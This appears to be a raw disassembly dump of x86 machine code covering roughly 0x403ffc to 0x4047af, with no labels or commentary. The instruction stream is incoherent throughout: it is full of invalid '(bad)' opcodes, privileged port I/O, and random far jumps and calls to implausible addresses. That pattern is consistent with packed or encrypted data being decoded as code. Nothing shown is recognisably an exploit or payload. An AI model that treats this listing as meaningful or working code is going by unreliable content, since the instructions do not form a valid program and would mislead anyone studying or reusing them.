  403ffc:	sub    ecx,esp
  403ffe:	lods   eax,DWORD PTR ds:[esi]
  403fff:	adc    eax,0x69c39a6b
  404004:	addr16 fdivrp st(4),st
  404007:	inc    esi
  404008:	mov    dl,BYTE PTR [ebx+0x455755b1]
  40400e:	adc    BYTE PTR [eax+0x34],dl
  404011:	xor    edx,ebp
  404013:	dec    BYTE PTR es:[ebp+0x50b5d8]
  40401a:	test   al,0xbf
  40401c:	aaa    
  40401d:	jg     0x40404f
  40401f:	jg     0x404021
  404021:	push   ss
  404022:	mov    al,ds:0x3ccadaf4
  404027:	jo     0x403fda
  404029:	icebp  
  40402a:	xlat   BYTE PTR ds:[ebx]
  40402b:	fcomip st,st(4)
  40402d:	sbb    ch,al
  40402f:	arpl   WORD PTR ds:0x29ec8776,dx
  404035:	ss cmp al,0x78
  404038:	push   es
  404039:	ja     0x404020
  40403b:	fs cmc 
  40403d:	pop    esp
  40403e:	mov    dl,0xfb
  404040:	xor    DWORD PTR [edx-0x58],ecx
  404043:	inc    esi
  404044:	push   ss
  404045:	push   edx
  404046:	or     ecx,DWORD PTR [eax-0x2f]
  404049:	cdq    
  40404a:	and    dl,al
  40404c:	mov    ebx,0x8d84c13c
  404051:	jmp    0x40400f
  404053:	icebp  
  404054:	cli    
  404055:	mov    ah,0xf0
  404057:	sahf   
  404058:	cmp    al,0xf4
  40405a:	cmp    cl,BYTE PTR [edx+0x33]
  40405d:	inc    ecx
  40405e:	pop    eax
  40405f:	jns    0x404002
  404061:	xchg   BYTE PTR [ebp+0x2f63b822],dh
  404067:	inc    eax
  404068:	dec    esi
  404069:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40406a:	add    ecx,eax
  40406c:	mov    ds:0x89793c80,eax
  404071:	mov    WORD PTR [esi],gs
  404073:	push   ds
  404074:	lds    edi,FWORD PTR [ebx+0x6ea51fa4]
  40407a:	add    ch,BYTE PTR [ecx-0x27]
  40407d:	sets   BYTE PTR [eax]
  404080:	xchg   edi,eax
  404081:	push   cs
  404082:	jno    0x40403c
  404084:	je     0x4040f7
  404086:	(bad)  
  404088:	shr    BYTE PTR [esp+edi*2],0x25
  40408c:	test   BYTE PTR [esi-0x7802ffa1],dh
  404092:	xor    BYTE PTR [ebp+0x7a],bl
  404095:	rcr    ch,0xb6
  404098:	inc    edi
  404099:	jbe    0x404092
  40409b:	dec    eax
  40409c:	mov    al,0x5e
  40409e:	add    BYTE PTR [edi+ecx*8],bh
  4040a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4040a2:	pop    eax
  4040a3:	mov    dl,0x6c
  4040a5:	push   eax
  4040a6:	stos   BYTE PTR es:[edi],al
  4040a7:	call   ecx
  4040a9:	or     ch,dh
  4040ab:	stos   DWORD PTR es:[edi],eax
  4040ac:	add    bl,BYTE PTR [esi+ecx*4]
  4040af:	(bad)  
  4040b0:	mov    eax,0xbb6cdae0
  4040b5:	pop    esi
  4040b6:	mov    ds:0x2a9a3719,eax
  4040bb:	pop    ebp
  4040bc:	mov    ah,0x89
  4040be:	sahf   
  4040bf:	jno    0x404134
  4040c1:	or     DWORD PTR [ecx+edx*8-0xc],ecx
  4040c5:	call   0x7d51febc
  4040ca:	mov    ebp,0xd9fa975a
  4040cf:	sti    
  4040d0:	daa    
  4040d1:	cmp    ecx,DWORD PTR [ebx+0x39fa58bc]
  4040d7:	lahf   
  4040d8:	fild   WORD PTR [ecx-0x56]
  4040db:	icebp  
  4040dc:	fsub   DWORD PTR [eax-0x2c]
  4040df:	xor    BYTE PTR [ecx*1-0x2f577060],dl
  4040e6:	stos   DWORD PTR es:[edi],eax
  4040e7:	ficomp WORD PTR [ebp-0x52fbbe45]
  4040ed:	jnp    0x404139
  4040ef:	sub    DWORD PTR [eax],esp
  4040f1:	xchg   edi,eax
  4040f2:	fadd   DWORD PTR [ebx+0x46]
  4040f5:	js     0x404124
  4040f7:	pop    es
  4040f8:	call   0x98af:0x14887a88
  4040ff:	xor    DWORD PTR [edi-0x19],esi
  404102:	sbb    BYTE PTR [edx+0x47c13727],dh
  404108:	dec    eax
  404109:	out    dx,al
  40410a:	cmp    BYTE PTR [edi],al
  40410c:	pop    ecx
  40410d:	or     eax,0xb9f2fc36
  404112:	and    edx,eax
  404114:	pushf  
  404115:	push   ebx
  404116:	jbe    0x4040b0
  404118:	mov    ?,WORD PTR [edx+0x52]
  40411b:	mov    ecx,0xc0a0b080
  404120:	xor    ebx,ebp
  404122:	shl    BYTE PTR [esi+0x6a19d950],0x8c
  404129:	popf   
  40412a:	mul    DWORD PTR [esi+0x2]
  40412d:	pop    ds
  40412e:	ret    0x3e54
  404131:	mov    eax,ds:0x278deead
  404136:	jns    0x404102
  404138:	ret    
  404139:	aam    0x12
  40413b:	inc    ecx
  40413c:	idiv   DWORD PTR [ecx-0x3f]
  40413f:	or     edi,edx
  404141:	call   0xdc039486
  404146:	stos   DWORD PTR es:[edi],eax
  404147:	xchg   esp,eax
  404148:	inc    eax
  404149:	add    al,0xef
  40414b:	push   eax
  40414c:	mov    ecx,0x9210bac7
  404151:	mov    ds:0x991b7528,eax
  404156:	push   ebp
  404157:	pop    ebp
  404158:	push   esi
  404159:	push   ebp
  40415a:	leave  
  40415b:	pop    esp
  40415c:	pop    ebx
  40415d:	xor    ebx,DWORD PTR [eax+ecx*2+0x21]
  404161:	or     edi,DWORD PTR [edi]
  404163:	sub    bh,BYTE PTR [eax]
  404165:	fnsave [ebx-0x52]
  404168:	or     al,0x8d
  40416a:	scas   eax,DWORD PTR es:[edi]
  40416b:	add    eax,0x84a06015
  404170:	inc    ebx
  404171:	inc    esp
  404172:	fiadd  DWORD PTR [ebp+0x33]
  404175:	ror    esi,cl
  404177:	pusha  
  404178:	pop    ebx
  404179:	imul   ebx,DWORD PTR [ebx-0x467e6044],0xa37dc1f2
  404183:	jle    0x4041a3
  404185:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404186:	sbb    DWORD PTR [ebp+0x534752ed],ecx
  40418c:	idiv   BYTE PTR [esi+0x3b644776]
  404192:	inc    ebx
  404193:	xchg   edx,eax
  404194:	pop    esp
  404195:	cwde   
  404196:	cwde   
  404197:	loope  0x4041f7
  404199:	mov    ds:0xc7c198c6,ax
  40419f:	cld    
  4041a0:	pop    ebp
  4041a1:	mov    bl,0xea
  4041a3:	lea    ebp,[edi+0x49]
  4041a6:	scas   eax,DWORD PTR es:[edi]
  4041a7:	retf   0x990f
  4041aa:	cli    
  4041ab:	and    DWORD PTR ds:0x4ebea5e5,esp
  4041b1:	dec    ebp
  4041b2:	inc    ebx
  4041b3:	pop    ds
  4041b4:	mov    ds:0xe754f7ba,al
  4041b9:	stos   DWORD PTR es:[edi],eax
  4041ba:	icebp  
  4041bb:	push   ebp
  4041bc:	out    dx,al
  4041bd:	mov    ecx,0x6cdd11ee
  4041c2:	xchg   BYTE PTR gs:[esi],dh
  4041c5:	ds adc al,0xe9
  4041c8:	dec    ebp
  4041c9:	test   DWORD PTR [esp+edx*2],eax
  4041cc:	adc    cl,BYTE PTR [ebx]
  4041ce:	pop    esi
  4041cf:	inc    ebx
  4041d0:	fldenv [ecx]
  4041d2:	sbb    DWORD PTR [edi+0x6d1e6a0d],0xffffff85
  4041d9:	(bad)  
  4041da:	ror    DWORD PTR [edi],1
  4041dc:	and    eax,DWORD PTR [edx-0x40]
  4041df:	mov    dh,0xa9
  4041e1:	mov    ebx,0x76e0691f
  4041e6:	retf   
  4041e7:	xor    al,BYTE PTR [edi]
  4041e9:	rol    DWORD PTR [esi],cl
  4041eb:	cmp    eax,0x7cc183aa
  4041f0:	test   eax,0x8e2008af
  4041f5:	or     ah,BYTE PTR [edx+0x73]
  4041f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4041f9:	or     al,0x17
  4041fb:	xchg   BYTE PTR [esi+0x1d],ah
  4041fe:	ret    
  4041ff:	pop    es
  404200:	mov    ds:0x663d2756,al
  404205:	popf   
  404206:	sar    BYTE PTR [esi+0x40],0x23
  40420a:	push   ds
  40420b:	test   DWORD PTR [eax],edx
  40420d:	jmp    0x120e9902
  404212:	jb     0x4041e4
  404214:	sbb    bl,BYTE PTR [ecx+0x6c]
  404217:	std    
  404218:	cwde   
  404219:	addr16 pop edi
  40421b:	dec    ebp
  40421c:	inc    esp
  40421d:	pop    edi
  40421e:	xor    esp,ecx
  404220:	icebp  
  404221:	ret    0xcc3f
  404224:	mov    esp,0xcdd0fca1
  404229:	lds    ebx,FWORD PTR [ecx+esi*4+0x2492afad]
  404230:	dec    edx
  404231:	pop    edx
  404232:	popf   
  404233:	(bad)  
  404234:	mov    eax,0xf7e29582
  404239:	and    eax,DWORD PTR [edx-0x711739f4]
  40423f:	push   0xa4de6fd9
  404244:	sub    esi,esp
  404246:	jl     0x4041e0
  404248:	int3   
  404249:	stos   BYTE PTR es:[edi],al
  40424a:	sub    BYTE PTR ds:0xfa6ef8a4,ah
  404250:	push   esp
  404251:	push   0xffffffda
  404253:	cmp    esp,DWORD PTR [edx+0x59]
  404256:	popf   
  404257:	into   
  404258:	imul   ebp,esp,0xffffffbb
  40425b:	xchg   edx,eax
  40425c:	fild   QWORD PTR [ebx+0x21]
  40425f:	sbb    al,0xcb
  404261:	cmc    
  404262:	and    edx,DWORD PTR [esi-0x28]
  404265:	mov    BYTE PTR [edx-0x31],al
  404268:	pushf  
  404269:	lahf   
  40426a:	ret    
  40426b:	enter  0xbaf8,0xac
  40426f:	fstp   DWORD PTR [ecx]
  404271:	pusha  
  404272:	out    0xc6,al
  404274:	pusha  
  404275:	sub    al,0x3
  404277:	jae    0x4042b2
  404279:	mov    ebx,0x9e1d1b4e
  40427e:	dec    esp
  40427f:	in     al,0xac
  404281:	mov    DWORD PTR [esi+0x5792fab9],ebp
  404287:	or     BYTE PTR [ebx],0x92
  40428a:	bound  ebp,QWORD PTR [esi+esi*8-0x1]
  40428e:	test   DWORD PTR [ecx-0x76],ecx
  404291:	and    bl,BYTE PTR [ebx-0x5295fbe2]
  404297:	cmp    ebx,esp
  404299:	ins    DWORD PTR es:[edi],dx
  40429a:	int3   
  40429b:	inc    esp
  40429c:	cmp    BYTE PTR [edx+0x16e55a85],cl
  4042a2:	mov    bl,0xa5
  4042a4:	jbe    0x4042ff
  4042a6:	add    eax,0x46ecf426
  4042ab:	mov    bl,0x1
  4042ad:	pop    edx
  4042ae:	fldenv [esi]
  4042b0:	fsub   DWORD PTR [ebp-0x474d4aea]
  4042b6:	mov    esi,0x13ab45cc
  4042bb:	xchg   edx,eax
  4042bc:	dec    esi
  4042bd:	inc    eax
  4042be:	sbb    BYTE PTR [ebx-0x53],dh
  4042c1:	xchg   ebp,eax
  4042c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4042c4:	cwde   
  4042c5:	jnp    0x404264
  4042c7:	push   edx
  4042c8:	push   es
  4042c9:	aad    0xf2
  4042cb:	dec    esp
  4042cc:	sub    ecx,DWORD PTR [edx+0x59]
  4042cf:	repnz sbb eax,0x211a0991
  4042d5:	mov    ecx,0xf194ae72
  4042da:	cmp    al,0x6f
  4042dc:	jno    0x404279
  4042de:	pop    es
  4042df:	sbb    BYTE PTR [esi+0x3ed62afb],bh
  4042e5:	and    edx,eax
  4042e7:	aad    0x2f
  4042e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4042ea:	mov    dl,0x89
  4042ec:	dec    eax
  4042ed:	aaa    
  4042ee:	(bad)  
  4042ef:	and    eax,0xe5d441e1
  4042f4:	dec    ebx
  4042f5:	arpl   WORD PTR [eax-0x7],di
  4042f8:	lods   al,BYTE PTR ds:[esi]
  4042f9:	xor    al,0xf
  4042fb:	pop    ebp
  4042fc:	bound  esp,QWORD PTR [esi+ebp*1]
  4042ff:	mov    bl,0x96
  404301:	adc    DWORD PTR [edi-0x39],0xffffffcc
  404305:	pop    ds
  404306:	or     dl,bh
  404308:	fsubr  QWORD PTR [edi]
  40430a:	push   0x633cd34c
  40430f:	xor    eax,0x4f66ec33
  404314:	push   edi
  404315:	mov    ebp,DWORD PTR [esi+0x29]
  404318:	add    ch,cl
  40431a:	int    0x89
  40431c:	ja     0x404393
  40431e:	xchg   esi,eax
  40431f:	in     al,0x25
  404321:	jmp    0x255cbb78
  404326:	jle    0x404353
  404328:	nop
  404329:	or     eax,0x1763d645
  40432e:	inc    esi
  40432f:	push   ecx
  404330:	inc    ebx
  404331:	jo     0x404384
  404333:	pop    eax
  404334:	aas    
  404335:	adc    DWORD PTR ds:[eax],ebp
  404338:	dec    ecx
  404339:	mov    ecx,0xbcb3aad5
  40433e:	xor    dh,BYTE PTR [ebx]
  404340:	lock mov bl,0xb5
  404343:	aam    0x40
  404345:	fdivr  QWORD PTR [edx-0x66268e9c]
  40434b:	jmp    0xccfc:0xc4e3e924
  404352:	sbb    eax,0xffffffa9
  404355:	lahf   
  404356:	hlt    
  404357:	aas    
  404358:	das    
  404359:	mov    ch,0xcd
  40435b:	ret    
  40435c:	mov    ch,0x22
  40435e:	and    BYTE PTR [eax],dh
  404360:	and    eax,0xc582c0d0
  404365:	jno    0x404316
  404367:	push   ebp
  404368:	or     DWORD PTR [esi-0x4d],ebp
  40436b:	pop    ebp
  40436c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40436d:	push   ecx
  40436e:	loop   0x4043e4
  404370:	xchg   ebp,eax
  404371:	dec    ebx
  404372:	dec    ecx
  404373:	xchg   edx,eax
  404374:	jmp    0xb66b:0x70db126c
  40437b:	sub    BYTE PTR [edi-0x3f],dl
  40437e:	lds    esi,FWORD PTR [eax-0x3e]
  404381:	imul   edx,DWORD PTR [eax+esi*2-0x48],0xffffffe3
  404386:	push   edi
  404387:	sbb    esp,esp
  404389:	xchg   edi,eax
  40438a:	cmp    DWORD PTR [ecx-0x70],edx
  40438d:	js     0x404312
  40438f:	push   ecx
  404390:	xchg   edi,eax
  404391:	fldenv [edi+0x1a]
  404394:	loop   0x40440c
  404396:	outs   dx,DWORD PTR ds:[esi]
  404397:	mov    ah,0xac
  404399:	adc    BYTE PTR [eax+eax*4],ah
  40439c:	cs enter 0xc69b,0x14
  4043a1:	jae    0x40438f
  4043a3:	add    cl,BYTE PTR [ecx-0xb64f305]
  4043a9:	or     DWORD PTR [ecx],0xffffffc1
  4043ac:	sahf   
  4043ad:	sbb    bh,bh
  4043af:	stos   DWORD PTR es:[edi],eax
  4043b0:	mov    ebx,0x2da920a8
  4043b5:	inc    edx
  4043b6:	pushf  
  4043b7:	outs   dx,BYTE PTR ds:[esi]
  4043b8:	cdq    
  4043b9:	mov    ebx,edi
  4043bb:	jno    0x4043f3
  4043bd:	jle    0x4043d8
  4043bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4043c0:	cmp    edi,DWORD PTR [ecx+0x27ced72]
  4043c6:	mov    edi,0x46b19f0c
  4043cb:	(bad)  
  4043cc:	popa   
  4043cd:	mov    esi,DWORD PTR [eax+eiz*2]
  4043d0:	and    BYTE PTR [esi],ch
  4043d2:	fadd   QWORD PTR [ebx-0x5b]
  4043d5:	jge    0x404443
  4043d7:	daa    
  4043d8:	dec    ebx
  4043d9:	(bad)  
  4043da:	loopne 0x4043d2
  4043dc:	fist   WORD PTR [edi+0x6044e47c]
  4043e2:	sqrtps xmm5,XMMWORD PTR [edx]
  4043e5:	int3   
  4043e6:	dec    eax
  4043e7:	fwait
  4043e8:	inc    edx
  4043e9:	lea    esi,[edx]
  4043eb:	je     0x404430
  4043ed:	cmp    al,0xfd
  4043ef:	jge    0x404378
  4043f1:	scas   eax,DWORD PTR es:[edi]
  4043f2:	and    bl,BYTE PTR [ecx]
  4043f4:	mov    eax,0x6ec23f9d
  4043f9:	push   eax
  4043fa:	or     eax,0x2c530f9b
  4043ff:	pop    es
  404400:	cmovle eax,DWORD PTR [edi+esi*2-0x326db89]
  404408:	lods   al,BYTE PTR ds:[esi]
  404409:	and    eax,0x8866fc8f
  40440e:	push   DWORD PTR [ecx+0x41]
  404411:	ret    0xaccb
  404414:	sub    ch,dl
  404416:	push   ds
  404417:	xchg   edx,eax
  404418:	(bad)  
  404419:	stos   DWORD PTR es:[edi],eax
  40441a:	(bad)
  40441d:	sub    ch,bh
  40441f:	aam    0xc4
  404421:	mov    DWORD PTR [ebp-0xf],esp
  404424:	mov    bh,0x7a
  404426:	lods   eax,DWORD PTR ds:[esi]
  404427:	cmp    ecx,DWORD PTR [eax-0x3a18878c]
  40442d:	or     ah,cl
  40442f:	inc    esp
  404430:	out    dx,al
  404431:	add    eax,0x3d758dd7
  404436:	mov    ch,0xbd
  404438:	push   edi
  404439:	inc    edi
  40443a:	nop
  40443b:	add    DWORD PTR [ecx],eax
  40443d:	sub    al,BYTE PTR [esi-0x3c]
  404440:	cmp    eax,0x64719a5b
  404445:	jmp    FWORD PTR [edi+esi*8-0x30]
  404449:	scas   al,BYTE PTR es:[edi]
  40444a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40444b:	xchg   BYTE PTR [ecx],al
  40444d:	adc    DWORD PTR [ebx+0x5a920012],edi
  404453:	sub    ebx,esi
  404455:	sub    DWORD PTR [edi+ebp*2-0x4e],ebp
  404459:	outs   dx,BYTE PTR ds:[esi]
  40445a:	mov    ecx,0xb83e93c5
  40445f:	jge    0x4044b1
  404461:	outs   dx,BYTE PTR ds:[esi]
  404462:	jmp    0xa41288cb
  404467:	or     BYTE PTR [eax+0x36152058],dl
  40446d:	mov    edi,0xf791ea6b
  404472:	cmp    eax,0x69d1cdd6
  404477:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404478:	push   ebp
  404479:	add    ebp,ebx
  40447b:	cmp    BYTE PTR ds:0x5597d8e1,dl
  404481:	bound  ebx,QWORD PTR [ebx+edx*8+0x58c2bb07]
  404488:	sub    DWORD PTR [ebx+0x4be3cfe7],0x5a9d0be2
  404492:	call   0xa4cb:0xda3e26d7
  404499:	rol    BYTE PTR [edi+0x2c],cl
  40449c:	mov    ch,bh
  40449e:	push   es
  40449f:	out    dx,al
  4044a0:	pusha  
  4044a1:	sbb    BYTE PTR [edi],bl
  4044a3:	push   0x3bcc4307
  4044a8:	jo     0x40448f
  4044aa:	add    al,0xa9
  4044ac:	mov    bl,0x9d
  4044ae:	pop    ss
  4044af:	cli    
  4044b0:	cmp    cl,ah
  4044b2:	ds int 0xcb
  4044b5:	enter  0xe4cf,0xae
  4044b9:	(bad)  
  4044ba:	xchg   ebp,eax
  4044bb:	js     0x4044fe
  4044bd:	add    bl,BYTE PTR [eax+0x7e]
  4044c0:	adc    cl,BYTE PTR [esi]
  4044c2:	mov    ebp,0x28a67efb
  4044c7:	nop
  4044c8:	imul   ebx,edi,0xee0ff45c
  4044ce:	sbb    eax,0xeed931c1
  4044d3:	add    eax,0xb870d634
  4044d8:	jl     0x40452a
  4044da:	adc    ah,BYTE PTR [ebp-0x19]
  4044dd:	or     eax,0x1a7a5de4
  4044e2:	jg     0x4044ad
  4044e4:	fucomi st,st(5)
  4044e6:	pop    edx
  4044e7:	cwde   
  4044e8:	push   0xffffffa5
  4044ea:	mov    al,0xa5
  4044ec:	mov    edx,0xf1fad2ce
  4044f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4044f2:	dec    esi
  4044f3:	test   DWORD PTR [eax],0x9c5ba57e
  4044f9:	xchg   ecx,eax
  4044fa:	mov    ecx,0x73908a79
  4044ff:	add    eax,0x15db9445
  404504:	push   es
  404505:	or     bh,BYTE PTR gs:[ecx+esi*1]
  404509:	adc    esi,esi
  40450b:	add    edi,0x25
  40450e:	xor    al,0xce
  404510:	lahf   
  404511:	rcr    BYTE PTR [eax+0x4bfcdc24],1
  404517:	dec    ecx
  404518:	jg     0x40457c
  40451a:	dec    esp
  40451b:	pop    ecx
  40451c:	aas    
  40451d:	push   esp
  40451e:	inc    ebp
  40451f:	sahf   
  404520:	test   al,0x61
  404522:	ins    DWORD PTR es:[edi],dx
  404523:	addr16 in eax,0xab
  404526:	stc    
  404527:	push   edi
  404528:	inc    ebp
  404529:	fs nop
  40452b:	mov    eax,ds:0x2063aaca
  404530:	jmp    0xb6f8:0x35efae3b
  404537:	or     al,0x8e
  404539:	xchg   ebx,eax
  40453a:	test   bl,ah
  40453c:	cmp    cl,BYTE PTR [ebx-0x6f]
  40453f:	jl     0x404543
  404541:	push   edi
  404542:	jp     0x40454e
  404544:	dec    ebp
  404545:	(bad)  
  404546:	std    
  404547:	inc    ebx
  404548:	xor    DWORD PTR [edi+edi*2+0x4a],esi
  40454c:	leave  
  40454d:	test   BYTE PTR [edi+0x6f],ch
  404550:	add    DWORD PTR [eax],eax
  404552:	sub    dl,BYTE PTR [esi]
  404554:	mov    ebp,0x7ef8a775
  404559:	imul   edi,DWORD PTR [ebp-0x31008f78],0x71a3a2f3
  404563:	pop    ss
  404564:	mov    BYTE PTR [esi+edi*1+0x48c9655],al
  40456b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40456c:	mov    BYTE PTR [edx+edx*8-0x75],0xb0
  404571:	add    al,0x2d
  404573:	push   ecx
  404574:	xor    al,0x25
  404576:	add    al,0x8e
  404578:	cmp    DWORD PTR [ecx+ebp*8],ebx
  40457b:	sti    
  40457c:	loop   0x404500
  40457e:	out    dx,eax
  40457f:	ins    BYTE PTR es:[edi],dx
  404580:	sbb    al,0x3e
  404582:	scas   eax,DWORD PTR es:[edi]
  404583:	outs   dx,DWORD PTR ds:[esi]
  404584:	les    esp,FWORD PTR [ebp+eiz*2+0x272aab12]
  40458b:	repnz test ebx,eax
  40458e:	pusha  
  40458f:	inc    ecx
  404590:	push   cs
  404591:	clc    
  404592:	aaa    
  404593:	xor    al,0x1b
  404595:	test   edi,0x6cfe727b
  40459b:	pop    ebx
  40459c:	and    BYTE PTR [edi-0x1676ee36],0xd6
  4045a3:	rcr    BYTE PTR [esi+0x60dfb85b],cl
  4045a9:	adc    BYTE PTR [ebx+0x7c912fd0],al
  4045af:	cli    
  4045b0:	push   ss
  4045b1:	pusha  
  4045b2:	test   al,0xfc
  4045b4:	push   edi
  4045b5:	mov    esp,ecx
  4045b7:	push   edi
  4045b8:	icebp  
  4045b9:	fcomp  st(3)
  4045bb:	fldenv [ebx]
  4045bd:	jl     0x404622
  4045bf:	mov    bl,bh
  4045c1:	mov    cl,0x71
  4045c3:	push   esp
  4045c4:	jecxz  0x404627
  4045c6:	repz jg 0x40456d
  4045c9:	scas   al,BYTE PTR es:[edi]
  4045ca:	or     ebp,DWORD PTR [ebx-0x28]
  4045cd:	inc    eax
  4045ce:	jae    0x40464d
  4045d0:	dec    edx
  4045d1:	shr    DWORD PTR [ebp+0xa],0x88
  4045d5:	loopne 0x404656
  4045d7:	outs   dx,DWORD PTR ds:[esi]
  4045d8:	addr16 or al,0xdd
  4045db:	xchg   DWORD PTR [esi-0x59],edx
  4045de:	mov    al,0x31
  4045e0:	and    BYTE PTR [ecx],ch
  4045e2:	cmp    DWORD PTR [esp+edx*2-0x4c],edi
  4045e6:	out    dx,al
  4045e7:	xchg   ebp,eax
  4045e8:	outs   dx,DWORD PTR ds:[esi]
  4045e9:	mov    ecx,0x466830ee
  4045ee:	cmc    
  4045ef:	sub    dh,BYTE PTR [eax]
  4045f1:	jmp    0x404588
  4045f3:	je     0x404577
  4045f5:	call   FWORD PTR [edi+0x39bd7483]
  4045fb:	loope  0x40467c
  4045fd:	in     eax,dx
  4045fe:	lods   eax,DWORD PTR cs:[esi]
  404600:	sbb    cl,dl
  404602:	push   ebp
  404603:	mov    edi,0x5c4ca4c6
  404608:	popf   
  404609:	xor    DWORD PTR [eax+eax*2+0x713f95ec],0xfffffffd
  404611:	sbb    al,0xbe
  404613:	pop    es
  404614:	xor    DWORD PTR [ebx-0x8],esp
  404617:	sbb    dh,cl
  404619:	std    
  40461a:	sub    al,0x4a
  40461c:	out    0x98,al
  40461e:	dec    ecx
  40461f:	jno    0x404608
  404621:	mov    esi,0x373e2fb0
  404626:	xor    bh,BYTE PTR [eax+0x7574431d]
  40462c:	sub    al,0xf0
  40462e:	ret    
  40462f:	fidiv  WORD PTR [eax]
  404631:	xchg   ebp,eax
  404632:	bound  esi,QWORD PTR [esi+0x6aaf92e6]
  404638:	xor    cl,dh
  40463a:	fidivr DWORD PTR [ecx+0x22]
  40463d:	dec    BYTE PTR [esi-0x6eae30e3]
  404643:	test   al,0xc2
  404645:	dec    esi
  404646:	xchg   esp,eax
  404647:	mov    edi,0x5c4c0b10
  40464c:	jns    0x4046bc
  40464e:	int    0xd6
  404650:	xor    eax,0x7e590d39
  404655:	adc    ecx,DWORD PTR [edi+0x53]
  404658:	call   0x91794b62
  40465d:	cwde   
  40465e:	sub    DWORD PTR [eax],0x9bea74e8
  404664:	repz mov edx,DWORD PTR [ebp-0x43]
  404668:	iret   
  404669:	dec    edi
  40466a:	fs or  eax,0x6ddcd511
  404670:	lods   al,BYTE PTR ds:[esi]
  404671:	cmp    al,0x93
  404673:	fiadd  DWORD PTR [eax]
  404675:	test   eax,0x79272138
  40467a:	into   
  40467b:	xchg   edi,eax
  40467c:	test   BYTE PTR [ebx],bl
  40467e:	dec    esi
  40467f:	lock shl DWORD PTR [eax+0x5cc7cff8],1
  404686:	mov    ah,BYTE PTR [esi-0x38ca5123]
  40468c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40468d:	push   0x7ff77f90
  404692:	mov    al,0x7f
  404694:	mov    eax,ds:0x313fc17f
  404699:	inc    eax
  40469a:	test   DWORD PTR [edx+0x36b61cd1],ebx
  4046a0:	jge    0x404685
  4046a2:	mov    cl,0xe
  4046a4:	bound  ebx,QWORD PTR [ecx]
  4046a6:	ds add bh,bl
  4046a9:	ins    BYTE PTR es:[edi],dx
  4046aa:	pop    edx
  4046ab:	lods   al,BYTE PTR ds:[esi]
  4046ac:	xor    BYTE PTR ds:0xcefd4d81,0x6a
  4046b3:	(bad)  
  4046b5:	or     DWORD PTR [ebp+0x7d],ecx
  4046b8:	fst    DWORD PTR [ebx+0x691a4888]
  4046be:	ins    DWORD PTR es:[edi],dx
  4046bf:	jne    0x40467a
  4046c1:	adc    ch,BYTE PTR [ecx]
  4046c3:	shl    BYTE PTR [eax],0xa3
  4046c6:	adc    DWORD PTR [ecx-0x971bb3c],ebp
  4046cc:	xchg   edi,eax
  4046cd:	inc    ebp
  4046ce:	pop    ss
  4046cf:	push   edx
  4046d0:	ret    
  4046d1:	sbb    eax,0x6b308bd7
  4046d6:	ins    BYTE PTR es:[edi],dx
  4046d7:	mov    dh,0x8d
  4046d9:	add    ebx,ebx
  4046db:	in     eax,dx
  4046dc:	(bad)  
  4046dd:	fisub  DWORD PTR [edi-0x4864e743]
  4046e3:	or     al,0x9f
  4046e5:	in     eax,dx
  4046e6:	retf   
  4046e7:	mov    ecx,0x51eab65d
  4046ec:	pop    es
  4046ed:	in     eax,0xd7
  4046ef:	mov    ds:0xd7083d62,eax
  4046f4:	out    dx,eax
  4046f5:	shr    DWORD PTR [edi],cl
  4046f7:	retf   
  4046f8:	call   0x84cf:0x62e4c0d
  4046ff:	shr    BYTE PTR ds:0x5ddb6e64,1
  404705:	std    
  404706:	sbb    BYTE PTR [ebx],0x54
  404709:	pop    es
  40470a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40470b:	cli    
  40470c:	sub    BYTE PTR [ebx-0x6c03552],dh
  404712:	leave  
  404713:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404714:	push   esp
  404715:	sbb    al,BYTE PTR [ecx+0x57688680]
  40471b:	leave  
  40471c:	mov    al,0xcd
  40471e:	mov    eax,ds:0xfdfd2573
  404723:	ret    
  404724:	push   ebp
  404725:	mov    al,0x5a
  404727:	or     eax,0xd5a86f90
  40472c:	icebp  
  40472d:	dec    ebx
  40472e:	inc    edi
  40472f:	test   BYTE PTR [esi+0x61eddb8b],0xe4
  404736:	aaa    
  404737:	push   ebx
  404738:	dec    esp
  404739:	mov    ds:0x584021bf,eax
  40473e:	outs   dx,DWORD PTR ds:[esi]
  40473f:	std    
  404740:	dec    ebx
  404741:	mov    dh,0x3c
  404743:	add    ah,BYTE PTR [edi+eax*1+0x3faeb45d]
  40474a:	sahf   
  40474b:	or     eax,0x894e775a
  404750:	dec    eax
  404751:	jmp    0xab76bef
  404756:	ss sub dh,0xa8
  40475a:	lock cmp eax,DWORD PTR [ecx-0x3da0e4e2]
  404761:	push   ds
  404762:	mov    BYTE PTR [esi],bh
  404764:	aad    0xa3
  404766:	cmp    ebx,DWORD PTR [esi]
  404768:	in     eax,0x2
  40476a:	mov    ch,0xa2
  40476c:	sbb    BYTE PTR [ecx+0x34],cl
  40476f:	out    0x78,eax
  404771:	bound  esp,QWORD PTR [esi+0x71]
  404774:	push   ds
  404775:	pop    esi
  404776:	ja     0x4047c4
  404778:	enterw 0x8b7f,0x3a
  40477d:	adc    BYTE PTR [ebx-0x3300b3ae],0xf
  404784:	pop    ss
  404785:	push   ss
  404786:	dec    edx
  404787:	push   edx
  404788:	sti    
  404789:	es jne 0x40471a
  40478c:	sbb    BYTE PTR cs:[esi-0x33dc9857],ah
  404793:	add    al,0xc1
  404795:	in     al,0xf6
  404797:	and    DWORD PTR [eax+0x69c9951f],ebx
  40479d:	push   edi
  40479e:	dec    edx
  40479f:	inc    edi
  4047a0:	outs   dx,BYTE PTR ds:[esi]
  4047a1:	stc    
  4047a2:	retf   
  4047a3:	sahf   
  4047a4:	out    dx,al
  4047a5:	cmp    DWORD PTR [edx-0x5aaafc91],edi
  4047ab:	jge    0x40473e
  4047ad:	jmp    0x404732
  4047af:	jns    0x404809
